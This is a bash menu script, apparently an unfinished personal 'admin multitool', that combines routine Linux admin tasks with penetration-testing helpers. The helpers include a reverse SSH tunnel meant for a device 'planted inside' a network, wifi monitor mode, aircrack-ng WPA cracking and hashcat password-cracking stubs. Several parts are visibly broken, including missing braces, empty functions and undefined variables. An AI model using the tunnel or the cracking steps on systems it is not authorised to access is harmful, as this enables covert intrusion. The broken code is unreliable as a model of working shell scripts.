#!/bin/bash

			#TODO: Check if user input contains unwanted characters 

# Make sure only the root user can run our script
# Or it is run with sudo
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root." 1>&2
   exit 1
fi


# Test an IP address for validity:
function valid_ip() {
    local  ip=$1
    local  stat=1

    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        OIFS=$IFS
        IFS='.'
        ip=($ip)
        IFS=$OIFS
        [[ ${ip[0]} -le 255 && ${ip[1]} -le 255 \
            && ${ip[2]} -le 255 && ${ip[3]} -le 255 ]]
	 stat=$?
    fi
    return $stat
}

function victimSSH_tunnel() {
	#>ssh -p $jumpSSHport -o ServerAliveInterval=60 -o TCPKeepAlive=yes -R 5022:localhost:22 $jumpUser@$jumpHostComp
	#|>run this from the session or device you have planted inside - to your jump box
	#|>will forward remote (jump box) port 5022 to insider port 22
	#TODO: enable user to customize all ports
	echo 'Please enter the username of the for the jumpbox.'
	echo ''
	read -p "User name: " jumpUser
	echo ''
	echo "Please specify the SSH keyfile to use for user $jumpUser"
	echo ''
	read -p "Enter the full path: " jumpSSHkey
	echo ''
	echo 'Please enter the hostname or IP of the jumpbox.'
	echo ''
	read -p "IP or hostname: " jumpHostComp
	echo ''
	echo "Please enter the remote port to connect to."
	echo ''
	read -p "Enter the remote SSH port: " jumpSSHport
	echo ''
	echo 'Connecting to the jumpbox...'
	echo ''
	ssh -p $jumpSSHport -i $jumpSSHkey -o ServerAliveInterval=60 -o TCPKeepAlive=yes -R 5022:localhost:22 $jumpUser@$jumpHostComp
}

function jumpBoxSSH_tunnel() {
	#|>ssh -p 5022 $insiderUser@$insiderHost
	#|>run this from the jump box, sends traffic to port 5022 local (jump box) to insider port 22 through https tunnel

}

function monitorMode_on() {
	#TODO: Verify functionality and add safety checks
	#airmon-ng check kill #<|This seems to break things...enable only if needed
	airmon-ng start $1
	iwconfig | grep $1mon
	echo "$1 is now in monitor mode! Please check the above output to verify."
}

function monitorMode_off() {
	#TODO: managed mode off
	airmon-ng stop $1mon
	service NetworkManager start #or service networking start
	echo "$1 is back in managed mode."
}

function connect_wifi() {
	ESSID=$1
	WPA_PASS=$2
	bash -c 'wpa_passphrase $ESSID $WPA_PASS >> /etc/wpa_supplicant/wpa_supplicant.conf'
	wpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant/wpa_supplicant.conf

function aircrack_wpa() {
	#TODO: add aircrack capability
	pcap=$1
	wordlist=#TODO: add a wordlist
	aircrack-ng $pcap -w $wordlist
	#grep KEY FOUND! to verify key is found

}

function create_wordMangles() {
	#TODO: add most common word mangles / -f c -k c etc. / -r OneRuleToRuleThemAll.rule /
	#input a wordlist, then apply all mangles to it and output to another file

}

function hashCrack() {
	#TODO: use hashcat to crack passwords

}

 while [ true ]
do

	echo ''#Font=Big https://www.coolgenerator.com/ascii-text-generator
	echo '    _       _           _         __  __       _ _   _ _              _'
	echo '   / \   __| |_ __ ___ (_)_ __   |  \/  |_   _| | |_(_) |_ ___   ___ | |'
	echo '  / _ \ / _` | |_ ` _ \| | |_ \  | |\/| | | | | | __| | __/ _ \ / _ \| |'
	echo ' / ___ \ (_| | | | | | | | | | | | |  | | |_| | | |_| | || (_) | (_) | |'
	echo '/_/   \_\__,_|_| |_| |_|_|_| |_| |_|  |_|\__,_|_|\__|_|\__\___/ \___/|_|'
	echo '' 
	#Menu with 6 options:
	echo "Please select an option:"
	echo ""
	echo "1) Add a user"
	echo "2) Change your SSH Port"
	echo "3) Set a static IP."
	echo "4) Change your MAC address (WIP)."
	echo "5) Create a folder."
	echo "6) Do a ping sweep of a network."
	echo "7) Put a wireless card in monitor/managed mode. (WIP)"
	echo "8) Monitor wifi. (WIP)" 
	echo "9) Setup a reverse SSH Tunnel. (WIP)"
	echo "10) Create mangled wordlist. (WIP)"
	echo "11) Crack passwords with hashcat. (WIP)"
	echo "12) Exit"
	echo ""
	#TODO: add wireless tool options
		#|>airmon-ng, airodump-ng, aireplay, etc
	#TODO: add reverse ssh tunnel options, from both ends - combine with screen for persistent sessions
		#|>ssh -p 443 -o ServerAliveInterval=60 -o TCPKeepAlive=yes -R 5022:localhost:22 <jumpUser>@<jumpHostComp>
			#|>run this from the session or device you have planted inside - to your jump box
			#|>will forward remote (jump box) port 5022 to insider port 22
		#|>ssh -p 5022 <insiderUser>@<insiderHost>
			#|>run this from the jump box, sends traffic to port 5022 local (jump box) to insider port 22 through https tunnel
	#TODO: add capability to restart all networking services
		#|>NetworkManager
		#|>wpa_supplicant
		#|>dhclient

	#Get user input
	read selection
	case "$selection" in
		1)
			#add user


			echo '     _       _     _'
			echo '    / \   __| | __| |   __ _   _   _ ___  ___ _ __ _'
			echo '   / _ \ / _` |/ _` |  / _` | | | | / __|/ _ \ |__(_)'
			echo '  / ___ \ (_| | (_| | | (_| | | |_| \__ \  __/ |   _'
			echo ' /_/   \_\__,_|\__,_|  \__,_|  \__,_|___/\___|_|  (_)'
			echo''


			#get user gecos information
			echo "Please enter the GECOS information for your new user: "
			echo "The format is: "
			echo "Name,Office,Office-Phone,Home-Phone,Other-contact"
			echo "Feel free to leave any fields blank."
			echo "If you want to add a user without GECOS information only type the username."
			read gecos
			username=$(echo $gecos | cut -d"," -f1)
			adduser $username --gecos $gecos
			echo ""
		;;

		2)
			#change your SSH port


			echo '   ____ _                              ____ ____  _   _   ____            _'
			echo '  / ___| |__   __ _ _ __   __ _  ___  / ___/ ___|| | | | |  _ \ ___  _ __| |_ _'
			echo ' | |   | |_ \ / _` | |_ \ / _| |/ _ \ \___ \___ \| |_| | | |_) / _ \| |__| __(_)'
			echo ' | |___| | | | (_| | | | | (_| |  __/  ___) |__) |  _  | |  __/ (_) | |  | |_ _'
			echo '  \____|_| |_|\__,_|_| |_|\__, |\___| |____/____/|_| |_| |_|   \___/|_|   \__(_)'
			echo '                          |___/'
			echo ''
			echo "Please enter the custom SSH port you would like to use:"
			#take user input
			#Check if user input a valid integer
			read -p "Port #: " sshport
			until [[ $sshport =~ ^([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$ ]]
			do	
				echo "Please enter a valid port number: "
				read -p "[1-65535]: " sshport
			done
			
			#TODO: check if the script can write to this file
			#Script must be run with sudo so all files are readable...
			sed -i "s/^#*Port.*/Port $sshport/" /etc/ssh/sshd_config
			echo "Restarting the SSH service..."
			service ssh restart
			echo ""
			service ssh status
			echo ""

		;;

		3)
			#set a static IP address; ask if user wants to change MAC as well


			echo '  ____       _         _        _   _        ___ ____'
			echo ' / ___|  ___| |_   ___| |_ __ _| |_(_) ___  |_ _|  _ \ _'
			echo ' \___ \ / _ \ __| / __| __/ _` | __| |/ __|  | || |_) (_)'
			echo '  ___) |  __/ |_  \__ \ || (_| | |_| | (__   | ||  __/ _'
			echo ' |____/ \___|\__| |___/\__\__,_|\__|_|\___| |___|_|   (_)'
			echo ''


			#need to get interface, IP, and subnet mask 
			#will take the selected interface down, change the information, then put it up again
			#echo "Please enter the IP you would like to use: "
	
			#get user's input for interface
			echo "Which interface would you like to change the IP for?"
			echo ''
			ip a
			echo ''
			read -p "Interface name: " iface
			echo ''
	
			#Get user input for the IP to set
			#Check to make sure IP is in the correct format ###.###.###.### (make sure regex allows for only single, double, or triple digits, 0-255)
			echo "Please enter the IP address you want to use (in dotted decimal format):"
			read -p "Enter IP: " staticIP
			until valid_ip "$staticIP"
			do
				echo "Please enter a valid IP address."
				read -p "Enter IP: " staticIP
			done
			echo ''
	
			#Get user input for the network mask
			#Check to make sure the netmask is in the correct format (same as above) 
			echo "Please enter the network mask (in dotted decimal format): "
			read -p "Enter netmask: " Netmask
			until valid_ip "$Netmask"
			do
				echo "Please enter a valid IP address."
				read -p "Enter IP: " Netmask
			done
			echo ''

			echo "Taking the interface down..."
			echo ''
			ifconfig $iface down
			#TODO: Check if interface is actually down...
			echo "Interface $iface is down."
			echo ''

			ifconfig $iface $staticIP netmask $Netmask up

			echo ''
			#TODO: Validate that the information has been changed
			echo "The information has been changed."
			echo ''

			echo "Bringing the interface back up..."
			ifconfig $iface up
			echo "The interface should be back up. Check the output below to see if you have the selected IP."
			ifconfig $iface
			echo ""
		;;

		4)		
			echo ""
			echo '   _____ _                              __  __          _____               _     _'
			echo '  / ____| |                            |  \/  |   /\   / ____|     /\      | |   | |                  _'
			echo ' | |    | |__   __ _ _ __   __ _  ___  | \  / |  /  \ | |         /  \   __| | __| |_ __ ___  ___ ___(_)'
			echo ' | |    | |_ \ / _` | |_ \ / _` |/ _ \ | |\/| | / /\ \| |        / /\ \ / _` |/ _` | |__/ _ \/ __/ __|'
			echo ' | |____| | | | (_| | | | | (_| |  __/ | |  | |/ ____ \ |____   / ____ \ (_| | (_| | | |  __/\__ \__ \_'
			echo '  \_____|_| |_|\__,_|_| |_|\__, |\___| |_|  |_/_/    \_\_____| /_/    \_\__,_|\__,_|_|  \___||___/___(_)'
			echo '                            __/ |'
			echo '                           |___/'
			echo ""
			echo "Would you like to change your MAC address?"
	
			#take user input if they would like to change MAC or not
			read -p "y/n: " changeMAC
			if [ $changeMAC = 'y' ]
				#TODO: check if user wants to set a MAC manually or randomly; add menu; add ASCII art
			then
				echo ''
				#menu with x# of options
				echo "Please make a selection: "
				echo "1) Get a random address of the same type."
				echo "2) Get a completely random address."
				echo "3) Set a random address (Keeping same OUI)."
				echo "4) Set a user-defined address (Full address)."
				echo "5) Reset the MAC address to its default permanent address."
				echo ''
				#take user's input for macchanger selection
				read -p "[1-5]: " choice2
				echo ''

				case "$choice2" in
				1)
					echo "Setting a random MAC address of the same device type."
					option="a"
				;;
				
				2)
					echo "Setting a completely random MAC address."
					option="r"
				;;
				
				3)
					echo "Setting a random MAC address (keeping the same OUI)."
					option="e"
				;;

				4)
					#TODO: make this work...keeps skipping code here somehow when I select option 4
					echo "Please enter the MAC address you would like to use: "
					read -p "[XX:XX:XX:XX:XX:XX]: " userMAC
					option="m"

					echo "Taking the interface down..."
					ifconfig $iface down
					#TODO: Check if interface is actually down...
					echo "Interface $iface is down."
	
					macchanger -$option $userMAC $iface
					echo "Your MAC has been changed"

					echo "Bringing the interface back up..."
					ifconfig $iface up
					echo "The interface should be back up. Check the output below to see if you have the selected IP."
					ifconfig $iface
					echo ""
					break

				;;

				5)
					echo "Resetting the address to its default permanent address..."
					option="p"
				;;

				esac
				
				echo ''
				echo "Taking the interface down..."
				ifconfig $iface down
				#TODO: Check if interface is actually down...
				echo "Interface $iface is down."

				macchanger -$option $userMAC $iface
				echo "Your MAC has been changed"
			fi	
			
			echo "Bringing the interface back up..."
			ifconfig $iface up
			echo "The interface should be back up. Check the output below to see if you have the selected MAC."
			ifconfig $iface
			echo ""
		;;
	
		5)
			#create a folder; ask user for name and location


			echo '   ____                _                                __       _     _'
			echo '  / ___|_ __ ___  __ _| |_ ___   _ __   _____      __  / _| ___ | | __| | ___ _ __ _'
			echo ' | |   | |__/ _ \/ _` | __/ _ \ | |_ \ / _ \ \ /\ / / | |_ / _ \| |/ _` |/ _ \ |__(_)'
			echo ' | |___| | |  __/ (_| | ||  __/ | | | |  __/\ V  V /  |  _| (_) | | (_| |  __/ |   _'
			echo '  \____|_|  \___|\__,_|\__\___| |_| |_|\___| \_/\_/   |_|  \___/|_|\__,_|\___|_|  (_)'
			echo''


			echo "Please enter the name of the folder you want to create:"
			#Get user input for folder to create
			read -p "Folder name: " folder_name
	
			#Get user input for folder location
			echo "Please enter the location where you want this folder:"
			echo "Hit enter if you want it in the current folder."
			read -p "Folder absolute path: " folder_location
			
			#create the folder
			echo "Creating your folder..."
			mkdir "$folder_location/$folder"
			echo "Your folder has been created in $folder_location/$folder"
			echo ""
		;;
	
		6)
			#ping sweep (from oneliner)


			echo '  ____  _'
			echo ' |  _ \(_)_ __   __ _   _____      _____  ___ _ __ _'
			echo ' | |_) | | |_ \ / _` | / __\ \ /\ / / _ \/ _ \ |_ (_)'
			echo ' |  __/| | | | | (_| | \__ \\ V  V /  __/  __/ |_) |'
			echo ' |_|   |_|_| |_|\__, | |___/ \_/\_/ \___|\___| .__(_)'
			echo '                |___/                        |_|'
			echo ''

			echo "Please enter the IP of the network you want to scan:"
			
			#Get user input for IP of network to scan
			read -p "IP address of network: " networkIP

			until valid_ip "$networkIP"
			do
				echo "Please enter a valid IP address."
				read -p "Enter IP: " networkIP
			done


			#Get CIDR for network to scan
			echo "Please enter the CIDR notation for the network: "
			read -p "CIDR: (/##)" cidr

			until [[ $cidr =~ ^\/([0-9]|[1-2][0-9]|3[0-2])$ ]]
			do	
				echo "Please enter a valid port number: "
				read -p "[/<num>]: " cidr
			done

			#TODO: add timing information to slow down scan (use -i<#>) default=25ms; figure out how to add short date to filename
			fping -g $networkIP$cidr > "$networkIP.txt"
			echo ""
	
		;;

		7)
			#put the wireless card in monitor or managed mode

		;;

		11)
			
			echo '   _____                _      _____                                    _       '
			echo '  / ____|              | |    |  __ \                                  | |    _ '
			echo ' | |     _ __ __ _  ___| | __ | |__) |_ _ ___ _____      _____  _ __ __| |___(_)'
			echo ' | |    | |__/ _` |/ __| |/ / |  ___/ _` / __/ __\ \ /\ / / _ \| |__/ _` / __|  '
			echo ' | |____| | | (_| | (__|   <  | |  | (_| \__ \__ \\ V  V / (_) | | | (_| \__ \_ '
			echo '  \_____|_|  \__,_|\___|_|\_\ |_|   \__,_|___/___/ \_/\_/ \___/|_|  \__,_|___(_)'
			echo ''
			#crack passwords with hashcat
			#get user input for attack type - make attack type listing with numeric selections;

			#get user input for hash type
			read -p "Hash type: > " hash_selection

			hashcat --help | grep -i $hash_selection
				#|>then prompt user to input the hash type # identifier;

			#Get user input for file with hashes to crack
				#|>Check if hashlist includes usernames (in format username:hash)
				#|>if so add --username to hashcat syntax

			#Get user input for password list to use for cracking

			#Ask user if they want to apply any mangling rules or a mask
				#|>if mask is chosen display a short help screen of default mask types
				#|>as well as describe -1 and -2 user masks
				#|>make sure character escapes work properly and don't cause problems below

			echo '\?l = abcdefghijklmnopqrstuvwxyz'
			echo '\?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ'
			echo '\?d = 0123456789'
			echo "\?s = \!\"\#\$\%\&\'\(\)\*\+\,\-\.\/\:\;\<\=\>\?\@\[\]\^\_\`\{\|\}\~"
			echo '\?a = \?l\?u\?d\?s'
			echo '\?b = 0x00 - 0xff'

			#basic execution syntax:
			hashcat -D1,2 -O --force -a $attack_type -m $hash_id $hash_list $pass_list

			#find out if hashcat has problems with blank variables
				#|>if not then add variables for the proper flags + user input for mangling/masks
				#|>ex: rules="-r $user_rules"
		;;
		12)
			#exit
			break
		;;

	esac
done
echo "All done here!  Quitting..."
exit 0
